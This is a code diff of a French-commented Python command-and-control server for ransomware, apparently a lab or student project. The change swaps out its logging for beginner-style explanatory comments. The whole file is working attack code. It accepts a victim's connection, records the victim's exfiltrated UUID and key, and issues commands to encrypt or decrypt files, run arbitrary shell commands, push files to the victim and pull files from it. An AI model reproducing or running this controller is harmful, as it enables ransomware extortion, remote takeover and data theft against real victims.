@@ -1,23 +1,10 @@
-import socket   # Pour la communication réseau
-import os       # Pour vérifier si les fichiers à envoyer existent
-import datetime # Import pour gérer l'horodatage (date et heure)
+import socket  # Pour la communication réseau
+import os      # Pour vérifier si les fichiers à envoyer existent
 
 # Adresse permettant d'écouter toutes les interfaces réseau de la VM
 ADRESSE_IP = '0.0.0.0' 
 # Le port de communication choisi pour le serveur TCP
 PORT_ECOUTE = 9526 
-
-def enregistrer_log(niveau, message):
-    """ Fonction pour créer un historique des actions du serveur """
-    # Récupère l'heure actuelle au format Jour/Mois/Année Heure:Minute:Seconde
-    horodatage = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-    
-    # Prépare la ligne de log (ex: [16/01/2026 10:30] [INFO] Commande envoyée)
-    ligne_log = f"[{horodatage}] [{niveau}] {message}\n"
-    
-    # Ouvre le fichier logs.txt en mode "a" (append) pour ajouter à la fin sans effacer le reste
-    with open("logs.txt", "a") as f:
-        f.write(ligne_log)
 
 def demarrer_serveur():
     # Création du socket AF_INET = IPv4, SOCK_STREAM = TCP
@@ -29,90 +16,93 @@ def demarrer_serveur():
         # Met le serveur en attente de connexions (mode écoute)
         serveur_socket.listen()
         print(f"Serveur en écoute sur le port {PORT_ECOUTE}...")
-        
-        # Enregistre le démarrage du serveur dans les logs
-        enregistrer_log("SYSTEM", "Le serveur C2 a démarré et attend des victimes.")
 
-        # accept() bloque le programme jusqu'à ce qu'un client se connecte
+        # s.accept() bloque le programme jusqu'à ce qu'un client se connecte
+        # Elle renvoie l'objet 'connexion' pour parler au client et son 'adresse'
         connexion, adresse_client = serveur_socket.accept()
         
         with connexion:
             print(f"Victime connectée : {adresse_client}")
-            # Enregistre l'adresse IP de la victime connectée
-            enregistrer_log("INFO", f"Nouvelle connexion établie avec {adresse_client}")
 
-            # Reçoit les infos d'identification (UUID et Clé)
+            # .recv(1024) reçoit jusqu'à 1024 octets de données du client
+            # .decode() transforme les octets reçus en texte lisible
             infos_recues = connexion.recv(1024).decode()
             print(f"Données de la victime : {infos_recues}")
-            # Log des informations d'exfiltration reçues
-            enregistrer_log("EXFILTRATION", f"Données reçues : {infos_recues}")
 
+            # Ouvre 'base_victimes.txt' pour ajouter du texte à la fin grace au mode "a" (append)
             with open("base_victimes.txt", "a") as victimes:
+                # Écrit les infos reçues pour les stocker de façon persistante
                 victimes.write(f"{adresse_client} -> {infos_recues}\n")
 
+            # Boucle infinie pour envoyer des ordres tant qu'on ne quitte pas
             while True:
+                # input() récupère ce que tu tapes au clavier
                 ordre = input("Action (chiffrer/dechiffrer/system/upload/download/quitter) > ").strip().lower()
 
+                # Si l'entrée est vide, on recommence la boucle
                 if not ordre: 
                     continue
                 
-                # Envoi de l'ordre au client
+                # .encode() transforme le texte en octets pour l'envoi sur le réseau
+                # .sendall() s'assure que tout le message est bien envoyé
                 connexion.sendall(ordre.encode())
-                # Log de chaque commande envoyée par l'attaquant
-                enregistrer_log("ACTION", f"Commande '{ordre}' envoyée à la victime.")
 
+                # Sortie de la boucle si l'utilisateur veut arrêter
                 if ordre == "quitter":
-                    # Log de la fermeture volontaire de session
-                    enregistrer_log("SYSTEM", "Session fermée par l'attaquant.")
                     break
 
+                # Si l'ordre est 'system', on demande quelle commande exécuter sur la victime
                 if ordre == "system":
                     commande_shell = input("Commande système à envoyer : ")
+                    # Envoie la commande spécifique après l'ordre 'system'
                     connexion.sendall(commande_shell.encode())
-                    # Log de la commande système spécifique
-                    enregistrer_log("ACTION_SYSTEM", f"Exécution de : {commande_shell}")
                 
                 elif ordre == "upload":
+                    # Demande le nom du fichier présent sur le serveur à envoyer
                     nom_fichier = input("Fichier à envoyer au client : ")
+                    # Envoie le nom du fichier au client pour qu'il sache comment l'appeler
                     connexion.sendall(nom_fichier.encode())
+                    # Vérifie si le fichier existe bien localement
                     if os.path.exists(nom_fichier):
+                        # Ouvre le fichier en lecture binaire
                         with open(nom_fichier, "rb") as f:
                             contenu = f.read()
+                            # Envoie d'abord la taille du fichier (calibrée sur 16 caractères)
                             connexion.sendall(str(len(contenu)).encode().ljust(16))
+                            # Envoie les données réelles du fichier
                             connexion.sendall(contenu)
 
+                        # APRES l'envoi, on lit la confirmation du client 
+                        # pour vider le buffer réseau avant de remonter au menu
                         confirmation = connexion.recv(1024).decode()
                         print("Fichier envoyé avec succès.")
-                        # Log du succès de l'upload
-                        enregistrer_log("INFO", f"Fichier '{nom_fichier}' envoyé avec succès au client.")
                     else:
                         print("Fichier introuvable.")
-                        # Log de l'erreur si le fichier n'existe pas sur le serveur
-                        enregistrer_log("ERROR", f"Échec Upload : '{nom_fichier}' est introuvable sur le serveur.")
+                    # Remonte au début de la boucle sans attendre de réponse
                     continue
 
                 elif ordre == "download":
+                    # Demande quel fichier récupérer sur la machine de la victime
                     nom_fichier = input("Fichier à récupérer du client : ")
+                    # Envoie le nom au client
                     connexion.sendall(nom_fichier.encode())
+                    # Reçoit la taille du fichier (16 octets)
                     taille_brute = connexion.recv(16).decode().strip()
-                    
+                    # Vérifie si le client a envoyé un message d'erreur au lieu d'une taille
                     if "ERREUR" in taille_brute:
                         print("Le client n'a pas trouvé le fichier.")
-                        # Log de l'erreur côté client
-                        enregistrer_log("ERROR", f"Échec Download : Le client n'a pas trouvé '{nom_fichier}'.")
                     else:
+                        # Reçoit les données selon la taille annoncée
                         donnees = connexion.recv(int(taille_brute))
+                        # Sauvegarde le fichier avec un préfixe pour le distinguer
                         with open("DL_" + nom_fichier, "wb") as f:
                             f.write(donnees)
                         print(f"Fichier {nom_fichier} récupéré.")
-                        # Log de la réussite de l'exfiltration de fichier
-                        enregistrer_log("INFO", f"Fichier '{nom_fichier}' exfiltré et sauvegardé sous 'DL_{nom_fichier}'.")
+                    # Remonte au début de la boucle sans attendre de réponse
                     continue
 
-                # Réponse générale du client (chiffrement ou résultat system)
+                # Attend la réponse du client (résultat du chiffrement ou de la commande)
                 reponse_client = connexion.recv(4096).decode()
                 print(f"\n[RETOUR CLIENT] :\n{reponse_client}")
-                # Log du résultat de l'action pour garder une trace du succès/échec
-                enregistrer_log("RESULTAT", f"Réponse du client : {reponse_client}")
 
 demarrer_serveur()
